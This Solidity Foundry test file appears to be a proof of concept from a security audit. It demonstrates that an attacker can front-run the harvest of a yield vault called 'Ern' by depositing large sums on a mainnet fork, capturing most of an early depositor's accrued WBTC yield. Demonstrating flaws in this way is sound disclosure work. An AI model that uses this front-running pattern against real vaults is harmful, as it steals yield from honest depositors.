// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;
import "forge-std/Test.sol";
import "../src/Ern.sol";

contract ErnTest is Test {
    address alice    = address(1);
    address attacker = address(2);

    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    Ern vault;

    // Alice = early depositor with 10,000 USDC
    // Attacker = MEV bot with 90,000 USDC (9x alice)
    uint256 constant ALICE_DEPOSIT    = 10_000e6;   // 10,000 USDC
    uint256 constant ATTACKER_DEPOSIT = 90_000e6;   // 90,000 USDC

    function setUp() public {
        vault = new Ern(
            ERC20(address(USDC)),
            ERC20(address(WBTC)),
            IAaveAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e),
            IDex(0xE592427A0AEce92De3Edee1F18E0157C05861564)
        );

        deal(address(USDC), alice,    ALICE_DEPOSIT);
        deal(address(USDC), attacker, ATTACKER_DEPOSIT);

        vm.startPrank(alice);
        USDC.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(attacker);
        USDC.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function _aTokenBalance() internal view returns (uint256) {
        return vault.getAaveUnderlying().balanceOf(address(vault));
    }

    function testHarvestFrontRun() public {
        // 1. Alice deposits 10,000 USDC - she is the sole depositor
        //    and generates ALL the yield for the next 30 days
        vm.prank(alice);
        vault.deposit(ALICE_DEPOSIT);

        emit log_named_uint("Alice shares", vault.balanceOf(alice));
        emit log_named_uint("aToken balance after Alice deposit", _aTokenBalance());

        // 2. 30 days pass - Aave accrues real organic yield on Alice's deposit
        //    Yield depends on Aave liquidity index at fork block
        vm.warp(block.timestamp + 30 days);

        uint256 balanceAfterYield = _aTokenBalance();
        uint256 organicYield = balanceAfterYield > vault.totalSupply()
            ? balanceAfterYield - vault.totalSupply() : 0;

        emit log_named_uint("aToken balance after 30 days (USDC 6dec)", balanceAfterYield);
        emit log_named_uint("Organic yield accrued by Alice (USDC 6dec)", organicYield);

        (bool harvestable, uint256 pendingYield) = vault.canHarvest();
        assertTrue(harvestable, "Should be harvestable");
        assertGt(organicYield, 0, "Alice must have generated yield");
        emit log_named_uint("Confirmed pending yield (USDC 6dec)", pendingYield);

        // 3. Attacker sees pending harvest tx in mempool and front-runs it
        //    depositing 90,000 USDC to dilute Alice's reward share from 100% -> 10%
        vm.prank(attacker);
        vault.deposit(ATTACKER_DEPOSIT);

        emit log_named_uint("Attacker shares", vault.balanceOf(attacker));
        emit log_named_uint("Total shares (alice + attacker)", vault.totalSupply());

        // 4. Harvest executes - reward split across ALL shares including attacker's
        vault.harvest(0);

        // 5. Result: attacker captures yield generated entirely by Alice
        uint256 aliceReward    = vault.claimableYield(alice);
        uint256 attackerReward = vault.claimableYield(attacker);

        emit log_string("--- Reward Distribution ---");
        emit log_named_uint("Alice reward    (WBTC satoshi)", aliceReward);
        emit log_named_uint("Attacker reward (WBTC satoshi)", attackerReward);

        assertTrue(attackerReward > aliceReward,
            "Attacker captures disproportionate yield");
        assertApproxEqRel(attackerReward, aliceReward * 9, 0.05e18,
            "Attacker receives ~9x alice reward (90k vs 10k shares)");
    }

    // Baseline: what Alice SHOULD have received without the attack
    function testFairDistributionNoAttack() public {
        vm.prank(alice);
        vault.deposit(ALICE_DEPOSIT);

        vm.warp(block.timestamp + 30 days);

        (bool harvestable,) = vault.canHarvest();
        assertTrue(harvestable);

        vault.harvest(0);

        uint256 aliceReward = vault.claimableYield(alice);
        emit log_named_uint("Alice fair reward (WBTC satoshi)", aliceReward);
        assertGt(aliceReward, 0);
    }

    // Quantifies exact loss: how much WBTC reward Alice loses due to front-run
    function testAliceYieldLossDueTo_FrontRun() public {
        // --- Scenario A: No attack ---
        vm.prank(alice);
        vault.deposit(ALICE_DEPOSIT);
        vm.warp(block.timestamp + 30 days);
        vault.harvest(0);
        uint256 fairReward = vault.claimableYield(alice);

        // --- Reset: deploy fresh vault ---
        vault = new Ern(
            ERC20(address(USDC)),
            ERC20(address(WBTC)),
            IAaveAddressesProvider(0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9e),
            IDex(0xE592427A0AEce92De3Edee1F18E0157C05861564)
        );
        deal(address(USDC), alice,    ALICE_DEPOSIT);
        deal(address(USDC), attacker, ATTACKER_DEPOSIT);
        vm.prank(alice);    USDC.approve(address(vault), type(uint256).max);
        vm.prank(attacker); USDC.approve(address(vault), type(uint256).max);

        // --- Scenario B: With attack ---
        vm.prank(alice);
        vault.deposit(ALICE_DEPOSIT);
        vm.warp(block.timestamp + 30 days);
        vm.prank(attacker);
        vault.deposit(ATTACKER_DEPOSIT);
        vault.harvest(0);
        uint256 attackedReward = vault.claimableYield(alice);

        // --- Summary ---
        emit log_string("========== Impact Summary ==========");
        emit log_named_uint("Alice deposit (USDC)",              ALICE_DEPOSIT / 1e6);
        emit log_named_uint("Attacker deposit (USDC)",           ATTACKER_DEPOSIT / 1e6);
        emit log_named_uint("Alice fair reward   (WBTC satoshi)", fairReward);
        emit log_named_uint("Alice actual reward (WBTC satoshi)", attackedReward);
        emit log_named_uint("Alice yield stolen  (WBTC satoshi)", fairReward - attackedReward);
        emit log_named_uint("Percent stolen (%)",
            ((fairReward - attackedReward) * 100) / fairReward);

        assertGt(fairReward, attackedReward, "Attack reduces Alice reward");
        assertApproxEqRel(attackedReward, fairReward / 10, 0.05e18,
            "Alice retains only ~10% of her fair reward");
    }
}
